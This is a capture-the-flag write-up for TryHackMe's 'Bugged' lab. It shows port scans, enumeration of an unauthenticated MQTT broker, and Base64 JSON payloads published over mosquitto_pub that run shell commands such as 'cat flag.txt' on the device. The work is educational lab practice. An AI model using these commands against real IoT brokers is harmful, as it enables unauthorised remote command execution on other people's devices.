# TryHackMe - Bugged Challenge

## Difficulty: Easy

## Introduction
This report documents the penetration testing process for the "Bugged" challenge on TryHackMe. The objective was to identify vulnerabilities in a simulated IoT environment running MQTT services and exploit them to retrieve the flag. The challenge involved reconnaissance, enumeration, and exploitation techniques commonly used in offensive security assessments.

All steps are detailed below for reproducibility. Tools used include Nmap, RustScan, Mosquitto clients, and CyberChef for decoding.

## Reconnaissance
### Step 1: Initial Port Scanning with Nmap
Performed a comprehensive scan to identify open ports and services.

**Command:**
```bash
nmap -sC -sV 10.201.119.152 -oN nmap_report
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 12:37 WIB
Nmap scan report for 10.201.119.152
Host is up (0.34s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c8:29:ea:c4:aa:1f:d2:cb:21:7c:af:e6:45:26:e3:60 (RSA)
|   256 af:50:8c:45:12:48:20:c3:79:a8:85:d8:99:e5:ac:7e (ECDSA)
|_  256 7c:90:50:a4:cb:e0:66:d8:19:cd:e3:85:70:d5:80:21 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.17 seconds
```

**Findings:** Only SSH (port 22) was identified as open initially. This scan was limited to default ports.

### Step 2: Full Port Scan with RustScan
To ensure no ports were missed, performed a full port scan from 1-65535.

**Command:**
```bash
rustscan -a 10.201.119.152 -r 1-65535
```

**Output:**
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1073741716'.
Open 10.201.119.152:22
Open 10.201.119.152:1883
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:55 UTC
Initiating Ping Scan at 05:55
Scanning 10.201.119.152 [2 ports]
Completed Ping Scan at 05:55, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:55
Completed Parallel DNS resolution of 1 host. at 05:55, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 5, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:55
Scanning 10.201.119.152 [2 ports]
Discovered open port 22/tcp on 10.201.119.152
Discovered open port 1883/tcp on 10.201.119.152
Completed Connect Scan at 05:55, 0.46s elapsed (2 total ports)
Nmap scan report for 10.201.119.152
Host is up, received conn-refused (0.32s latency).
Scanned at 2025-11-10 05:55:27 UTC for 0s
```

**Findings:** Identified an additional open port: 1883 (MQTT).

### Step 3: Service Enumeration on Port 1883
Performed detailed service scan on the MQTT port.

**Command:**
```bash
nmap -sC -sV -p 1883 10.201.119.152
```

**Output:**
```
Nmap scan report for 10.201.119.152
Host is up (0.30s latency).

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/load/bytes/received/1min: 4457.81
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/clients/inactive: 0
|     $SYS/broker/load/connections/1min: 1.83
|     $SYS/broker/load/messages/sent/5min: 96.36
|     $SYS/broker/load/sockets/5min: 0.56
|     $SYS/broker/clients/active: 2
|     $SYS/broker/publish/bytes/received: 70184
|     livingroom/speaker: {"id":13187155414830996647,"gain":59}
|     storage/thermostat: {"id":3194752987291729975,"temperature":24.378649}
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/clients/total: 2
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/load/publish/sent/5min: 6.48
|     $SYS/broker/clients/disconnected: 0
|     $SYS/broker/uptime: 1375 seconds
|     $SYS/broker/bytes/sent: 10863
|     $SYS/broker/messages/sent: 2131
|     $SYS/broker/store/messages/count: 35
|     $SYS/broker/bytes/received: 98324
|     $SYS/broker/load/publish/sent/1min: 30.15
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/publish/bytes/sent: 357
|     $SYS/broker/publish/messages/sent: 61
|     $SYS/broker/load/sockets/1min: 1.70
|     $SYS/broker/retained messages/count: 38
|     $SYS/broker/messages/stored: 35
|     $SYS/broker/load/bytes/received/5min: 4272.87
|     $SYS/broker/load/connections/5min: 0.39
|     $SYS/broker/load/messages/received/15min: 70.80
|     $SYS/broker/load/bytes/sent/5min: 621.49
|     $SYS/broker/load/bytes/sent/1min: 1592.12
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/publish/sent/15min: 2.19
|_    $SYS/broker/load/messages/received/1min: 93.31
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   224.64 ms 10.9.0.1
2   ... 3
4   290.96 ms 10.201.119.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds
```

**Findings:** MQTT service (Mosquitto 2.0.14) is running. Nmap's MQTT subscribe script revealed various topics, including IoT device data and a suspicious topic: `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config`.

## Enumeration
### Step 4: Subscribing to All MQTT Topics
To gather more information, subscribed to all topics using Mosquitto client.

**Command:**
```bash
mosquitto_sub -h 10.201.119.152 -t "#" -v
```

**Output:**
```
patio/lights {"id":7661078753248470644,"color":"GREEN","status":"OFF"}
kitchen/toaster {"id":1543310849485169503,"in_use":true,"temperature":141.60777,"toast_time":282}
storage/thermostat {"id":5068269368810504611,"temperature":24.156727}
frontdeck/camera {"id":3599840246618073424,"yaxis":113.17587,"xaxis":-150.01305,"zoom":4.948657,"movement":true}
livingroom/speaker {"id":14213980530691105498,"gain":46}
patio/lights {"id":17929298276906098437,"color":"ORANGE","status":"ON"}
storage/thermostat {"id":10617027214367847731,"temperature":24.13278}
kitchen/toaster {"id":16718664506401065479,"in_use":true,"temperature":142.77162,"toast_time":356}
livingroom/speaker {"id":16188731603760509899,"gain":69}
storage/thermostat {"id":13583581327923860485,"temperature":24.424389}
patio/lights {"id":7225869367656763894,"color":"ORANGE","status":"ON"}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

**Findings:** Discovered a Base64-encoded message on the `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config` topic.

### Step 5: Decoding the Configuration
Decoded the Base64 string using CyberChef.

**Decoded Content:**
```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": ["HELP", "CMD", "SYS"],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

**Findings:** This appears to be a configuration for a command execution interface over MQTT, allowing commands like CMD (command execution).

## Exploitation
### Step 6: Crafting and Sending a Command
Prepared a JSON payload to execute the `ls` command and encoded it in Base64.

**Payload:**
```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"ls"}
```

**Base64 Encoded:**
```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsICJjbWQiOiJDTUQi
LCAiYXJnIjoibHMifQo=
```

**Command to Publish:**
```bash
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsICJjbWQiOiJDTUQi
LCAiYXJnIjoibHMifQo=" -h 10.201.119.152
```

**Response (via subscription):** Confirmed command execution capability.

### Step 7: Retrieving the Flag
Modified the argument to `cat flag.txt` and published the command.

**Payload:**
```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"cat flag.txt"}
```

**Response:**
```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "flag{****************}\n"
}
```

**Findings:** Successfully retrieved the flag: `flag{*****************}`.

## Conclusion
The challenge was successfully completed by exploiting an insecure MQTT configuration that allowed remote command execution. Key vulnerabilities included exposed MQTT topics and lack of authentication on the command interface.

**Recommendations:**
- Implement authentication and authorization for MQTT brokers.
- Avoid exposing sensitive topics or configurations.
- Regularly audit IoT devices for command injection vulnerabilities.

This report provides a step-by-step guide for educational purposes. All actions were performed in a controlled environment.
